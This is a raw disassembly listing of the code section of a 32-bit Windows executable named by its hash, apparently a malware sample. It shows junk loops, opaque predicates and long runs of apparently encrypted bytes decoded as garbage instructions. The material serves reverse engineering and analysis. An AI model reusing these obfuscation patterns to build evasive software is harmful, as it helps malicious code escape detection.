
bf17cc0330ff66b192f71ad6b9a351655d3d15c6d83309cdc04bec9782725a64.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	mov    DWORD PTR ds:0x434329,0x7186
  401015:	mov    DWORD PTR [ebp-0x20],eax
  401018:	mov    ecx,DWORD PTR [ebp-0x20]
  40101b:	mov    DWORD PTR ds:0x43429e,0x6cee
  401025:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40102c:	mov    DWORD PTR ds:0x4325f0,0x6120
  401036:	cmp    ecx,eax
  401038:	mov    DWORD PTR ds:0x43431d,0x7018
  401042:	jne    0x4019f7
  401048:	mov    ax,WORD PTR [ebp-0x24]
  40104c:	push   esi
  40104d:	mov    DWORD PTR ds:0x4325fc,0x1b
  401057:	cmp    DWORD PTR ds:0x4325fc,0x0
  40105e:	je     0x40108e
  401064:	cmp    DWORD PTR ds:0x4325fc,0x22
  40106b:	jne    0x40107c
  401071:	push   0x432cc2
  401076:	call   DWORD PTR ds:0x4328b2
  40107c:	mov    ecx,DWORD PTR ds:0x4325fc
  401082:	dec    ecx
  401083:	mov    DWORD PTR ds:0x4325fc,ecx
  401089:	jmp    0x401057
  40108e:	mov    ecx,0x8a3e
  401093:	mov    DWORD PTR ds:0x43428a,0x48c
  40109d:	xor    ax,cx
  4010a0:	add    DWORD PTR ds:0x434319,0x61ba
  4010aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4010ad:	xor    esi,DWORD PTR ds:0x434296
  4010b3:	push   edi
  4010b4:	mov    DWORD PTR ds:0x43427a,0x1c
  4010be:	cmp    DWORD PTR ds:0x43427a,0x0
  4010c5:	je     0x401105
  4010cb:	cmp    DWORD PTR ds:0x43427a,0x25
  4010d2:	jne    0x4010f3
  4010d8:	push   0x38d9
  4010dd:	push   DWORD PTR [ebp-0xc]
  4010e0:	push   0x7b63
  4010e5:	push   0x618f
  4010ea:	push   DWORD PTR [ebp-0x28]
  4010ed:	call   DWORD PTR ds:0x4328b6
  4010f3:	mov    edi,DWORD PTR ds:0x43427a
  4010f9:	dec    edi
  4010fa:	mov    DWORD PTR ds:0x43427a,edi
  401100:	jmp    0x4010be
  401105:	mov    edi,0x3b04
  40110a:	xor    DWORD PTR ds:0x432600,edx
  401110:	add    ax,di
  401113:	add    DWORD PTR ds:0x43429a,0xf3f
  40111d:	movzx  eax,ax
  401120:	add    DWORD PTR ds:0x4325f4,edi
  401126:	not    eax
  401128:	or     esi,DWORD PTR ds:0x434311
  40112e:	and    eax,DWORD PTR [ecx]
  401130:	movzx  ecx,WORD PTR ds:0x432cc2
  401137:	xor    DWORD PTR ds:0x432ce6,ecx
  40113d:	mov    ecx,DWORD PTR [ebp+0x8]
  401140:	sub    DWORD PTR ds:0x434325,ecx
  401146:	mov    DWORD PTR [ecx],eax
  401148:	adc    ecx,0x6b0b
  40114e:	mov    ecx,0x7510855
  401153:	sbb    esi,DWORD PTR ds:0x432cda
  401159:	mov    esi,0x32729c
  40115e:	sbb    DWORD PTR ds:0x434325,0x3918
  401168:	push   ebx
  401169:	or     DWORD PTR ds:0x4342a2,ebx
  40116f:	mov    ax,WORD PTR [ebp-0x24]
  401173:	dec    ebx
  401174:	movzx  eax,ax
  401177:	mov    DWORD PTR [ebp-0x38],eax
  40117a:	sub    eax,0x1c8b
  40117f:	mov    eax,DWORD PTR [ebp+0x8]
  401182:	mov    DWORD PTR [ebp-0x28],eax
  401185:	xor    eax,eax
  401187:	or     eax,DWORD PTR ds:0x432cce
  40118d:	add    DWORD PTR ds:0x434276,eax
  401193:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  40119a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4011a1:	mov    eax,0x9577
  4011a6:	or     DWORD PTR ds:0x43429a,0x2325
  4011b0:	mov    WORD PTR [ebp-0x4],ax
  4011b4:	movzx  ebx,BYTE PTR ds:0x4325f4
  4011bb:	or     DWORD PTR ds:0x4325f0,ebx
  4011c1:	lea    eax,[ebp-0x30]
  4011c4:	mov    DWORD PTR [ebp-0x34],eax
  4011c7:	mov    eax,DWORD PTR [ebp-0x28]
  4011ca:	mov    DWORD PTR [ebp-0x2c],eax
  4011cd:	add    DWORD PTR ds:0x434319,0x693e
  4011d7:	lea    eax,[ebp-0x18]
  4011da:	and    DWORD PTR ds:0x43426a,0x0
  4011e4:	jmp    0x4011f6
  4011e9:	mov    ebx,DWORD PTR ds:0x43426a
  4011ef:	inc    ebx
  4011f0:	mov    DWORD PTR ds:0x43426a,ebx
  4011f6:	cmp    DWORD PTR ds:0x43426a,0x18
  4011fd:	jae    0x40123a
  401203:	cmp    DWORD PTR ds:0x43426a,0x8
  40120a:	jne    0x40121b
  401210:	push   0x7a50
  401215:	call   DWORD PTR ds:0x4328ba
  40121b:	cmp    DWORD PTR ds:0x43426a,0x7
  401222:	jne    0x401235
  401228:	mov    ebx,DWORD PTR ds:0x43426a
  40122e:	inc    ebx
  40122f:	mov    DWORD PTR ds:0x43426a,ebx
  401235:	jmp    0x4011e9
  40123a:	mov    DWORD PTR [ebp-0x1c],eax
  40123d:	mov    eax,DWORD PTR [ebp-0x1c]
  401240:	mov    DWORD PTR [eax],0xf89f2da9
  401246:	mov    eax,DWORD PTR [ebp-0x14]
  401249:	mov    ebx,DWORD PTR [ebp-0x8]
  40124c:	and    DWORD PTR ds:0x434315,0x66ce
  401256:	xor    eax,ecx
  401258:	xor    ebx,ecx
  40125a:	and    DWORD PTR ds:0x434319,0x3a0f
  401264:	xor    edx,edx
  401266:	and    DWORD PTR ds:0x432ce6,0x4325f0
  401270:	add    eax,esi
  401272:	mov    DWORD PTR ds:0x43431d,0x1b71
  40127c:	add    ebx,esi
  40127e:	div    ebx
  401280:	mov    DWORD PTR ds:0x434276,0x5747
  40128a:	mov    edx,DWORD PTR [ebp-0x2c]
  40128d:	mov    DWORD PTR ds:0x4325f4,0x57da
  401297:	cmp    eax,DWORD PTR [edx]
  401299:	mov    DWORD PTR ds:0x434282,0x6b31
  4012a3:	je     0x4019ca
  4012a9:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4012b0:	lea    eax,[ebp-0xc]
  4012b3:	sbb    edx,DWORD PTR ds:0x432cca
  4012b9:	mov    DWORD PTR [ebp-0x10],eax
  4012bc:	mov    eax,DWORD PTR [ebp-0x10]
  4012bf:	jmp    0x401447
  4012c4:	popa   
  4012c5:	xchg   BYTE PTR ds:0x6151e949,cl
  4012cb:	mov    dh,0x3f
  4012cd:	mov    ah,0xd5
  4012cf:	mov    dl,0xa3
  4012d1:	call   0x7070:0x707041d5
  4012d8:	in     eax,0x7f
  4012da:	jo     0x40134c
  4012dc:	rcl    bh,0x3d
  4012df:	aad    0x39
  4012e1:	ror    edi,cl
  4012e3:	rol    eax,1
  4012e5:	pop    es
  4012e6:	push   es
  4012e7:	add    ecx,DWORD PTR [esi]
  4012e9:	jmp    0x1ac2:0xf330f02
  4012f0:	(bad)  
  4012f1:	adc    bl,BYTE PTR [edi]
  4012f3:	mov    ecx,0xddb7025a
  4012f8:	add    bh,ch
  4012fa:	mov    ebp,0x8003c8db
  4012ff:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401305:	lods   eax,DWORD PTR ds:[esi]
  401306:	sar    BYTE PTR [eax+0x6fee581f],1
  40130c:	or     edx,DWORD PTR [ecx]
  40130e:	sahf   
  40130f:	jp     0x4012d9
  401311:	inc    edx
  401312:	lods   al,BYTE PTR ds:[esi]
  401313:	push   ebx
  401314:	sub    eax,0xad3ec6d1
  401319:	mov    WORD PTR [ebx-0x3b],?
  40131c:	stos   DWORD PTR es:[edi],eax
  40131d:	js     0x4012e5
  40131f:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401325:	jmp    0x401359
  401327:	mov    ebp,ecx
  401329:	dec    edi
  40132a:	fcomp  DWORD PTR [eax-0x656800bf]
  401330:	pop    es
  401331:	test   eax,0xed4dbddc
  401336:	sub    BYTE PTR [ebp+0x23],dl
  401339:	mov    ah,0xec
  40133b:	pusha  
  40133c:	nop
  40133d:	mov    esi,0x94c3117b
  401342:	and    esi,edx
  401344:	jmp    0x401396
  401346:	(bad)  
  401347:	out    0xba,al
  401349:	repnz in al,dx
  40134b:	xchg   esp,eax
  40134c:	xor    edi,ecx
  40134e:	jbe    0x4013b5
  401350:	xlat   BYTE PTR ds:[ebx]
  401351:	and    cl,ch
  401353:	add    al,0xd9
  401355:	adc    DWORD PTR [ecx-0x68],edx
  401358:	xor    eax,0x7a616f03
  40135d:	or     dh,BYTE PTR [ecx]
  40135f:	fld    QWORD PTR [eax+0x7f752a56]
  401365:	xor    BYTE PTR [edi+0xba8db0c],cl
  40136b:	pop    ebx
  40136c:	push   ebp
  40136d:	(bad)  
  40136f:	or     ebx,edx
  401371:	pop    esi
  401372:	fstp   DWORD PTR [ecx]
  401374:	jno    0x401306
  401376:	mov    eax,0x2b15374b
  40137b:	ja     0x4013a6
  40137d:	sbb    al,0xd3
  40137f:	xor    BYTE PTR [edi-0x16],cl
  401382:	int    0xa6
  401384:	add    ebp,ebx
  401386:	add    ebp,DWORD PTR [edx+esi*4+0x68]
  40138a:	and    BYTE PTR [ebp+0x794186a8],ch
  401390:	cmp    edi,eax
  401392:	int3   
  401393:	sbb    BYTE PTR [ebx-0xb],0x84
  401397:	daa    
  401398:	in     al,dx
  401399:	push   esi
  40139a:	xor    ebx,DWORD PTR [edi+0x7a]
  40139d:	push   cs
  40139e:	ja     0x4013dd
  4013a0:	inc    ecx
  4013a1:	ds aaa 
  4013a3:	cmp    DWORD PTR [edi-0x13],0xffffffdd
  4013a7:	ins    DWORD PTR es:[edi],dx
  4013a8:	mov    WORD PTR [edx+ebx*8-0x2081e4f3],ss
  4013af:	in     eax,0xe4
  4013b1:	xor    DWORD PTR [edx-0x76ffc9a1],ecx
  4013b7:	out    0x8,al
  4013b9:	sub    ch,dl
  4013bb:	nop
  4013bc:	add    esp,edx
  4013be:	or     ebx,edx
  4013c0:	push   eax
  4013c1:	push   esi
  4013c2:	aad    0x22
  4013c4:	dec    DWORD PTR [ecx+eiz*1-0x71]
  4013c8:	xchg   DWORD PTR [ebp-0x5e],esi
  4013cb:	jl     0x40134f
  4013cd:	mov    ah,0xe6
  4013cf:	repnz loope 0x4013dd
  4013d2:	xchg   ecx,eax
  4013d3:	and    BYTE PTR [ecx-0x149b81ec],ah
  4013d9:	sub    cl,BYTE PTR [esi]
  4013db:	sbb    BYTE PTR [edx+0x350e09c4],dl
  4013e1:	pop    ecx
  4013e2:	adc    al,0x92
  4013e4:	iret   
  4013e5:	mov    ebx,0x9a4ef2e
  4013ea:	mov    ecx,0x23e72f01
  4013ef:	sub    edx,edi
  4013f1:	xchg   esi,eax
  4013f2:	daa    
  4013f3:	push   esp
  4013f4:	ret    0x4d12
  4013f7:	hlt    
  4013f8:	inc    ebp
  4013f9:	in     eax,0xe2
  4013fb:	out    dx,al
  4013fc:	mov    dl,0x7f
  4013fe:	dec    esi
  4013ff:	jne    0x40147a
  401401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401402:	daa    
  401403:	loope  0x4013d3
  401405:	fdiv   DWORD PTR [ecx+0x4b6d806]
  40140b:	out    dx,al
  40140c:	out    0x47,eax
  40140e:	les    ebx,FWORD PTR [ebx+0x65]
  401411:	jo     0x40146b
  401413:	sbb    BYTE PTR ds:0x40c7780c,cl
  401419:	add    BYTE PTR [esi+0x6d1b14f2],0xd3
  401420:	retf   0x2369
  401423:	(bad)  [ecx-0x3b3563c2]
  401429:	cmp    dl,BYTE PTR [ebx-0x59c72b1]
  40142f:	mov    dl,0xe4
  401431:	xor    al,0x8a
  401433:	and    eax,0xf55edfeb
  401438:	jl     0x401451
  40143a:	leave  
  40143b:	and    ch,bh
  40143d:	and    ah,dl
  40143f:	std    
  401440:	sbb    eax,0xc97e6e5
  401445:	or     ebx,DWORD PTR [eax]
  401447:	mov    edx,DWORD PTR [eax]
  401449:	imul   edx,edx,0xf89ea9ec
  40144f:	mov    DWORD PTR [eax],edx
  401451:	mov    eax,DWORD PTR [ebp-0xc]
  401454:	cmp    eax,0x742b26d4
  401459:	jmp    0x4015e1
  40145e:	push   ds
  40145f:	fcmovnb st,st(2)
  401461:	mov    edx,0x5ba661c1
  401466:	xlat   BYTE PTR ds:[ebx]
  401467:	les    ecx,FWORD PTR [esi]
  401469:	test   DWORD PTR [edi-0x1afb0208],edi
  40146f:	jg     0x4014e1
  401471:	jo     0x401458
  401473:	jg     0x4014e5
  401475:	jo     0x401473
  401477:	outs   dx,BYTE PTR ds:[si]
  401479:	xor    dl,BYTE PTR [ebp-0x17]
  40147c:	push   es
  40147d:	push   esi
  40147e:	stos   BYTE PTR es:[edi],al
  40147f:	int3   
  401480:	lock adc DWORD PTR [edi],ebx
  401483:	fcomp  QWORD PTR [edi-0x47]
  401486:	jge    0x40145c
  401488:	push   eax
  401489:	push   0x52facb50
  40148e:	cli    
  40148f:	lods   al,BYTE PTR ds:[esi]
  401490:	pop    es
  401491:	jae    0x401444
  401493:	into   
  401494:	and    cl,BYTE PTR ds:0x8944aeef
  40149a:	repnz and al,0x8a
  40149d:	mov    ah,BYTE PTR [edi+0x3f68b491]
  4014a3:	sub    al,0x96
  4014a5:	inc    esp
  4014a6:	stos   DWORD PTR es:[edi],eax
  4014a7:	add    eax,0x2395956f
  4014ac:	or     ecx,ebp
  4014ae:	sub    eax,0xdf44d2ea
  4014b3:	pop    DWORD PTR [edi-0x9]
  4014b6:	out    0x5d,al
  4014b8:	jne    0x401458
  4014ba:	idiv   BYTE PTR [edi+0x413a5889]
  4014c0:	pop    ss
  4014c1:	adc    eax,0xc500fb61
  4014c6:	test   DWORD PTR [esp+esi*8+0x6dc2a0c3],ecx
  4014cd:	lods   eax,DWORD PTR ds:[esi]
  4014ce:	push   es
  4014cf:	sub    edi,eax
  4014d1:	aas    
  4014d2:	jmp    0x401498
  4014d4:	ror    DWORD PTR [esi],0x9f
  4014d7:	fsubrp st(5),st
  4014d9:	mov    ebx,0x16f6c097
  4014de:	cli    
  4014df:	cwde   
  4014e0:	xor    BYTE PTR [esi+0x7dc8a99c],al
  4014e6:	cmp    cl,BYTE PTR [ecx+eiz*2]
  4014e9:	mov    es,WORD PTR [ebx-0x5e956645]
  4014ef:	adc    BYTE PTR [edx],cl
  4014f1:	dec    edi
  4014f2:	lock mov eax,0x8e330a6b
  4014f8:	loopne 0x401576
  4014fa:	mov    dh,0x4c
  4014fc:	es jmp 0x72ed:0x867dca52
  401504:	push   ebp
  401505:	jg     0x40152f
  401507:	cwde   
  401508:	dec    eax
  401509:	cmp    ebx,DWORD PTR [eax]
  40150b:	daa    
  40150c:	xchg   edi,eax
  40150d:	dec    edx
  40150e:	outs   dx,DWORD PTR ds:[si]
  401510:	push   ss
  401511:	(bad)  
  401512:	adc    DWORD PTR [ebx-0x58],esp
  401515:	hlt    
  401516:	(bad)  
  401517:	lods   eax,DWORD PTR ds:[esi]
  401518:	pop    esi
  401519:	pminsw mm5,QWORD PTR [edi]
  40151c:	(bad)  
  40151d:	sbb    al,0xb0
  40151f:	mov    eax,esi
  401521:	jmp    0xe28:0xb12d1edf
  401528:	in     eax,0xca
  40152a:	pop    ds
  40152b:	cmp    edi,ebp
  40152d:	pushf  
  40152e:	pop    ds
  40152f:	(bad)  
  401530:	scas   eax,DWORD PTR es:[edi]
  401531:	scas   al,BYTE PTR es:[edi]
  401532:	rcl    edi,1
  401534:	enter  0x6a44,0xce
  401538:	pop    esp
  401539:	int    0xa8
  40153b:	ja     0x401587
  40153d:	fst    DWORD PTR [edi]
  40153f:	xor    al,0x2a
  401541:	mov    ebx,0x92b2cccc
  401546:	ficomp DWORD PTR [ecx-0x55]
  401549:	hlt    
  40154a:	and    BYTE PTR [ebp-0x6dd33836],ah
  401550:	jnp    0x401586
  401552:	sbb    BYTE PTR [ebp-0x448e20a7],dl
  401558:	pop    eax
  401559:	inc    edi
  40155a:	ret    
  40155b:	and    cl,BYTE PTR [edx]
  40155d:	sbb    al,0xf9
  40155f:	push   esp
  401560:	fmul   DWORD PTR [edx+eiz*8+0x26]
  401564:	in     al,0x4d
  401566:	lahf   
  401567:	jl     0x401560
  401569:	iret   
  40156a:	das    
  40156b:	add    cl,bl
  40156d:	nop
  40156e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40156f:	mov    ?,WORD PTR [edi-0x119a8202]
  401575:	mov    ch,0x1e
  401577:	test   eax,0x43cb20e3
  40157c:	jnp    0x40157c
  40157e:	fcomp  st(2)
  401580:	push   edi
  401581:	adc    bl,dl
  401583:	sub    BYTE PTR [eax-0x58],cl
  401586:	jmp    0x9182:0xd03abfae
  40158d:	icebp  
  40158e:	push   ds
  40158f:	cld    
  401590:	fs mov bh,0x67
  401593:	add    bl,BYTE PTR [edx+ecx*8-0x7a1fb6a8]
  40159a:	cld    
  40159b:	sbb    al,BYTE PTR [ecx-0x1571decd]
  4015a1:	fbstp  TBYTE PTR [esi]
  4015a3:	jnp    0x401607
  4015a5:	mov    eax,ds:0x18cfba33
  4015aa:	ja     0x4015c1
  4015ac:	dec    ebp
  4015ad:	clc    
  4015ae:	fist   DWORD PTR [eax-0x5c4e1d1d]
  4015b4:	addr16 daa 
  4015b6:	out    0x5,al
  4015b8:	push   eax
  4015b9:	loop   0x4015ae
  4015bb:	sub    BYTE PTR [ebp+0x77ee7631],al
  4015c1:	xor    eax,0x1f94da0
  4015c6:	adc    BYTE PTR [ebx+0x75],0x47
  4015ca:	je     0x4015af
  4015cc:	add    edx,DWORD PTR [eax+0x23257687]
  4015d2:	xchg   edi,eax
  4015d3:	cmp    cl,BYTE PTR [edi-0x719425c]
  4015d9:	mov    edx,0xd6862b5
  4015de:	repnz push ebp
  4015e0:	pop    esp
  4015e1:	je     0x4015f5
  4015e7:	mov    eax,DWORD PTR [ebp-0x1c]
  4015ea:	or     DWORD PTR [eax],0x60751c9c
  4015f0:	jmp    0x4019d9
  4015f5:	mov    eax,DWORD PTR [ebp-0xc]
  4015f8:	add    eax,DWORD PTR [ebp-0x18]
  4015fb:	cmp    eax,0x6cca547d
  401600:	je     0x401614
  401606:	mov    eax,DWORD PTR [ebp-0x10]
  401609:	and    DWORD PTR [eax],0x751c99
  40160f:	jmp    0x4019d9
  401614:	mov    eax,DWORD PTR [ebp-0xc]
  401617:	mov    edx,DWORD PTR [ebp-0x18]
  40161a:	or     eax,edx
  40161c:	cmp    eax,0xfcbf2ffd
  401621:	je     0x401635
  401627:	mov    eax,DWORD PTR [ebp-0x10]
  40162a:	xor    DWORD PTR [eax],0x2650fa8f
  401630:	jmp    0x4019d9
  401635:	mov    ax,WORD PTR [ebp-0x4]
  401639:	mov    edx,0x8a3e
  40163e:	xor    ax,dx
  401641:	mov    edx,DWORD PTR [ebp-0x28]
  401644:	mov    edx,DWORD PTR [edx]
  401646:	add    ax,di
  401649:	cmp    ax,WORD PTR [edx]
  40164c:	je     0x401821
  401652:	mov    eax,DWORD PTR [ebp-0x14]
  401655:	xor    eax,ecx
  401657:	add    eax,esi
  401659:	mov    DWORD PTR [ebp-0x30],eax
  40165c:	mov    eax,DWORD PTR [ebp-0x34]
  40165f:	mov    dx,WORD PTR [ebp-0x38]
  401663:	mov    ebx,0x8a3e
  401668:	xor    dx,bx
  40166b:	mov    ebx,DWORD PTR [ebp-0x8]
  40166e:	add    dx,di
  401671:	jmp    0x4017f9
  401676:	clc    
  401677:	repnz sbb eax,0xa851698d
  40167d:	icebp  
  40167e:	pusha  
  40167f:	xchg   ebx,eax
  401680:	rcl    DWORD PTR [ebx+0x71],1
  401683:	cdq    
  401684:	cld    
  401685:	in     al,0x4a
  401687:	jle    0x4016f9
  401689:	jo     0x401670
  40168b:	jg     0x4016fd
  40168d:	jo     0x40162d
  40168f:	push   eax
  401690:	mov    ds:0x97dcc8f7,al
  401695:	jmp    0x6e3e4036
  40169a:	mov    WORD PTR [edx],ds
  40169c:	and    dl,BYTE PTR [esi]
  40169e:	mov    dl,0xa5
  4016a0:	js     0x4016c6
  4016a2:	outs   dx,DWORD PTR ds:[esi]
  4016a3:	imul   esi
  4016a5:	sub    eax,0x9540653f
  4016aa:	bound  esp,QWORD PTR [ecx]
  4016ac:	dec    ecx
  4016ad:	xchg   ebx,eax
  4016ae:	xor    bh,cl
  4016b0:	xor    al,0xbd
  4016b2:	add    al,0xbc
  4016b4:	icebp  
  4016b5:	nop
  4016b6:	test   eax,0x636b56bf
  4016bb:	stc    
  4016bc:	dec    esi
  4016bd:	pusha  
  4016be:	lods   eax,DWORD PTR ds:[esi]
  4016bf:	xchg   edi,eax
  4016c0:	mov    edi,0xad0c0412
  4016c5:	lea    edi,[edi+0x2b832ac2]
  4016cb:	imul   ebx,DWORD PTR [ecx-0x3d],0x7
  4016cf:	jle    0x40169a
  4016d1:	cdq    
  4016d2:	jne    0x40167b
  4016d4:	mov    ch,0xc7
  4016d6:	fsub   DWORD PTR [esi-0x3b]
  4016d9:	or     DWORD PTR [ebx],esp
  4016db:	sub    al,0xa9
  4016dd:	push   esp
  4016de:	or     BYTE PTR [ebp+0x3e58b15c],dl
  4016e4:	lock cmp eax,0xb4e677fe
  4016ea:	adc    DWORD PTR [eax+0x9171fb1],eax
  4016f0:	xor    eax,0xd60bbcc0
  4016f5:	fs stos DWORD PTR es:[edi],eax
  4016f7:	jmp    0xd792fabf
  4016fc:	push   ebp
  4016fd:	dec    esp
  4016fe:	addr16 push edi
  401700:	mov    ebx,0x7c482a8c
  401705:	retf   0xadd4
  401708:	in     eax,dx
  401709:	mov    esp,0x22c5f09e
  40170e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40170f:	arpl   WORD PTR [ebx],bp
  401711:	fisubr WORD PTR [esi+eiz*2]
  401714:	pop    ds
  401715:	xchg   ebx,eax
  401716:	ret    
  401717:	(bad)  
  401718:	and    al,0x12
  40171a:	mov    edi,0xe742498c
  40171f:	int3   
  401720:	pop    eax
  401721:	adc    DWORD PTR [ecx-0x30],ebx
  401724:	dec    ebp
  401725:	loop   0x401766
  401727:	out    0x82,eax
  401729:	mov    ah,0xd2
  40172b:	xchg   esi,eax
  40172c:	iret   
  40172d:	jmp    0x31c3681f
  401732:	sub    BYTE PTR [edx+0x7efdfac9],dl
  401738:	adc    DWORD PTR [ebx+0x280be491],edi
  40173e:	xchg   DWORD PTR [ebx-0x64],ebx
  401741:	xchg   ecx,eax
  401742:	fcomi  st,st(1)
  401744:	jle    0x40171b
  401746:	mov    al,ds:0xc871f212
  40174b:	iret   
  40174c:	daa    
  40174d:	mov    eax,DWORD PTR [ebx]
  40174f:	and    al,0xaf
  401751:	js     0x401711
  401753:	xchg   DWORD PTR [edi],ebp
  401755:	mov    gs,eax
  401757:	gs jg  0x40175e
  40175a:	sbb    esi,ebp
  40175c:	push   0xffffff80
  40175e:	stc    
  40175f:	add    BYTE PTR [edx],cl
  401761:	scas   eax,DWORD PTR es:[edi]
  401762:	stos   DWORD PTR es:[edi],eax
  401763:	dec    edx
  401764:	mov    bl,bh
  401766:	popf   
  401767:	adc    bl,dl
  401769:	mov    eax,ds:0x2b4bff0
  40176e:	sbb    eax,0x17f8bbd5
  401773:	es jp  0x401768
  401776:	mov    ah,0xc4
  401778:	jmp    0xc834:0xa8e2b994
  40177f:	push   edx
  401780:	neg    BYTE PTR [edi+0x69]
  401783:	std    
  401784:	je     0x40176d
  401786:	ss scas eax,DWORD PTR es:[edi]
  401788:	test   al,0xd1
  40178a:	int    0x6a
  40178c:	out    dx,eax
  40178d:	cmc    
  40178e:	jno    0x4017db
  401790:	test   al,0x94
  401792:	mov    al,0x35
  401794:	pop    esi
  401795:	sbb    eax,0x3f7fbbe9
  40179a:	or     eax,0x6fa8a151
  40179f:	jmp    0xa817:0xa1ee1db2
  4017a6:	mov    al,BYTE PTR [edx-0x77]
  4017a9:	mov    ecx,0x9d8cbe8f
  4017ae:	inc    edx
  4017af:	pop    ss
  4017b0:	out    0xa7,eax
  4017b2:	gs mov dh,0x47
  4017b5:	xchg   esi,edx
  4017b7:	xor    BYTE PTR [edi],dl
  4017b9:	xlat   BYTE PTR ds:[ebx]
  4017ba:	dec    esp
  4017bb:	clc    
  4017bc:	rol    BYTE PTR [esi+0xc81122c],1
  4017c2:	sub    edx,DWORD PTR [ebp-0x5c]
  4017c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017c6:	dec    esi
  4017c7:	cli    
  4017c8:	stc    
  4017c9:	test   eax,0x5ef243e9
  4017ce:	shl    DWORD PTR [ebx-0x720f6d13],cl
  4017d4:	mov    eax,0x2fb1e994
  4017d9:	push   ebx
  4017da:	xchg   ebx,eax
  4017db:	push   es
  4017dc:	mov    ds:0xdfcd0af9,al
  4017e1:	aas    
  4017e2:	adc    edx,DWORD PTR [ecx+0x57]
  4017e5:	pop    edi
  4017e6:	loopne 0x401774
  4017e8:	sub    al,0xd2
  4017ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017eb:	js     0x401854
  4017ed:	adc    al,BYTE PTR [esi-0x19]
  4017f0:	mov    eax,gs:0xb9d3c16b
  4017f6:	int    0x36
  4017f8:	jge    0x401809
  4017fa:	mov    bh,0xd2
  4017fc:	xor    ebx,ecx
  4017fe:	lea    edx,[edx+ebx*1+0x32729c]
  401805:	add    DWORD PTR [eax],edx
  401807:	mov    eax,DWORD PTR [ebp-0x2c]
  40180a:	mov    edx,DWORD PTR [ebp-0x8]
  40180d:	mov    ebx,DWORD PTR [ebp-0x30]
  401810:	xor    edx,ecx
  401812:	add    edx,esi
  401814:	imul   edx,ebx
  401817:	sub    DWORD PTR [eax],edx
  401819:	mov    eax,DWORD PTR [ebp-0x14]
  40181c:	jmp    0x4019dc
  401821:	mov    eax,DWORD PTR [ebp-0xc]
  401824:	mov    edx,DWORD PTR [ebp-0x18]
  401827:	jmp    0x4019af
  40182c:	pop    ebx
  40182d:	arpl   di,di
  40182f:	out    dx,eax
  401830:	xchg   ebx,esi
  401832:	imul   esi,DWORD PTR [ebx-0x5d],0x7d
  401836:	jae    0x401839
  401838:	push   esi
  401839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40183a:	sbb    edx,esp
  40183c:	aas    
  40183d:	jl     0x4018af
  40183f:	jo     0x401826
  401841:	jg     0x4018b3
  401843:	jo     0x4017da
  401845:	or     BYTE PTR [ecx+0x1a],al
  401848:	or     BYTE PTR [eax],bl
  40184a:	sub    BYTE PTR [ebx+0x46ccee6],dl
  401850:	arpl   WORD PTR [edx+0x165f22f2],cx
  401856:	mov    al,ds:0xa910cf50
  40185b:	mov    edx,0xabcf602b
  401860:	aas    
  401861:	push   eax
  401862:	xor    al,0x80
  401864:	cmp    eax,0x76b8147a
  401869:	mov    WORD PTR [esi+ecx*1-0x6a],gs
  40186d:	lods   al,BYTE PTR ds:[esi]
  40186e:	std    
  40186f:	mov    ebp,0x8a281e65
  401874:	sub    al,0x4b
  401876:	sbb    DWORD PTR [ecx+0x27],ebp
  401879:	pop    ds
  40187a:	mov    BYTE PTR [ebp-0x1b128c84],cl
  401880:	retf   0xfe1d
  401883:	fmul   DWORD PTR [ecx+0x34]
  401886:	mov    BYTE PTR [edx-0x7b7acfa4],ah
  40188c:	cld    
  40188d:	xor    BYTE PTR [esi-0x8],dl
  401890:	ror    edx,0xfc
  401893:	mov    bh,0x4a
  401895:	loope  0x4018f6
  401897:	inc    eax
  401898:	imul   ebx,eax,0x2d5cce14
  40189e:	or     DWORD PTR [ebx],eax
  4018a0:	shl    ah,1
  4018a2:	dec    esi
  4018a3:	fistp  QWORD PTR [ebp-0x699f54a8]
  4018a9:	into   
  4018aa:	cdq    
  4018ab:	mov    eax,esi
  4018ad:	mov    bl,0x61
  4018af:	dec    ebp
  4018b0:	push   ds
  4018b1:	add    eax,0x8d310070
  4018b6:	in     eax,0x18
  4018b8:	cmp    eax,0xba5f092
  4018bd:	aam    0xcc
  4018bf:	mov    edi,0x70f35f26
  4018c4:	daa    
  4018c5:	mov    bl,0x4c
  4018c7:	xor    eax,0xcf9ec244
  4018cc:	ret    
  4018cd:	ins    BYTE PTR es:[edi],dx
  4018ce:	dec    esi
  4018cf:	cmp    DWORD PTR [ebx],ecx
  4018d1:	sbb    esi,DWORD PTR [ecx+0x3077aa0d]
  4018d7:	popf   
  4018d8:	or     ah,dh
  4018da:	mov    dl,0x83
  4018dc:	or     al,0x6a
  4018de:	call   DWORD PTR [ebx+0x8ff68a5]
  4018e4:	xchg   ebp,eax
  4018e5:	push   ebx
  4018e6:	push   esp
  4018e7:	out    0xd1,al
  4018e9:	xchg   ebx,eax
  4018ea:	scas   eax,DWORD PTR es:[edi]
  4018eb:	or     ebx,esi
  4018ed:	inc    esp
  4018ee:	out    dx,al
  4018ef:	push   ebx
  4018f0:	outs   dx,DWORD PTR ds:[esi]
  4018f1:	and    cl,BYTE PTR es:[ebx+esi*4-0x704c1950]
  4018f9:	xor    eax,0x5429045b
  4018fe:	fwait
  4018ff:	sbb    ebp,DWORD PTR [esi+0x1445e8f1]
  401905:	mov    bh,0xe5
  401907:	out    dx,al
  401908:	cmp    BYTE PTR [eax+0x2f],bl
  40190b:	and    ebx,DWORD PTR [ecx+0x73]
  40190e:	jmp    0x75aa2305
  401913:	inc    edx
  401914:	mov    bh,0x5e
  401916:	jmp    0x13b4:0xebff5aff
  40191d:	ret    0x73d6
  401920:	je     0x4018cc
  401922:	adc    eax,DWORD PTR [ecx+0x7ac292c8]
  401928:	and    eax,ecx
  40192a:	lock shl esp,0x0
  40192e:	pop    ss
